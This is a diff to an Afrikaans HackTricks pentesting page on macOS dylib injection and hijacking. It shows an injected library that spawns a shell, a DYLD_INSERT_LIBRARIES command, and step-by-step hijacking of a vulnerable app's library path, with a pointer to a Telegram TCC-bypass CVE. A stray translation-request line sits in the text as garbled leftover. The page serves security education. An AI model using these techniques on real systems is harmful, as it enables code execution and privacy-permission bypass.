@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Basiese voorbeeld van DYLD_INSERT_LIBRARIES
+## DYLD_INSERT_LIBRARIES Basiese voorbeeld
 
-**Biblioteek om in te spuit** om 'n shell uit te voer:
+**Library om te inject** om ’n shell uit te voer:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binêre lêer om aan te val:
+Binary om aan te val:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -37,7 +37,7 @@ Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Example
+## Dyld Hijacking-voorbeeld
 
 Die geteikende kwesbare binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
@@ -66,7 +66,7 @@ path @loader_path/../lib2 (offset 12)
 
 {{#tab name="@rpath"}}
 ```bash
-# Check librareis loaded using @rapth and the used versions
+# Check libraries loaded using @rpath and the versions used
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
 name @rpath/lib.dylib (offset 24)
 time stamp 2 Thu Jan  1 01:00:02 1970
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Met die vorige inligting weet ons dat dit **nie die signature van die gelaaide libraries nagaan nie** en dat dit **probeer om ’n library vanaf** te laai:
+Met die vorige inligting weet ons dat dit **nie die signature van die gelaaide libraries nagaan nie** en **probeer om ’n library vanaf** te laai:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Dus, dit is moontlik om dit te hijack! Skep 'n library wat **enige willekeurige code uitvoer en dieselfde funksionaliteite** as die legitieme library export deur dit te reexport. En onthou om dit met die verwagte weergawes te compile:
+Dus, dit is moontlik om dit te hijack! Skep ’n library wat **enige arbitrêre code uitvoer en dieselfde funksionaliteite** as die legitieme library export deur dit te reexport. En onthou om dit met die verwagte weergawes te compile:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Please provide the English Markdown content to translate.
+Plak asseblief die inhoud wat vertaal moet word.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Die reexport path wat in die library geskep is, is relatief tot die loader; kom ons verander dit na ’n absolute path na die library wat uitgevoer moet word:
+Die reexport path wat in die library geskep is, is relatief tot die loader; kom ons verander dit na 'n absolute path na die library wat uitgevoer moet word:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Uiteindelik, kopieer dit bloot na die **hijacked location**:
+Kopieer dit uiteindelik net na die **hijacked location**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-En **voer** die binary uit en kontroleer of die **library gelaai is**:
+En **execute** die binary en check of die **library was loaded**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,7 +133,7 @@ En **voer** die binary uit en kontroleer of die **library gelaai is**:
 </code></pre>
 
 > [!TIP]
-> ’n Goeie writeup oor hoe om hierdie vulnerability te misbruik om Telegram se cameratoestemmings te misbruik, kan gevind word by [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> ’n Goeie writeup oor hoe om hierdie vulnerability te abuse om Telegram se kameratoestemmings te abuse, kan gevind word by [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Groter skaal
 
@@ -141,8 +141,7 @@ As jy van plan is om libraries in onverwagte binaries te inject, kan jy die even
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## Verwysings
+## References
 
-- [1] [CVE-2023-26818 - TCC omseil met Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
+- [1] [CVE-2023-26818 - Omseiling van TCC met Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {{#include ../../../../banners/hacktricks-training.md}}
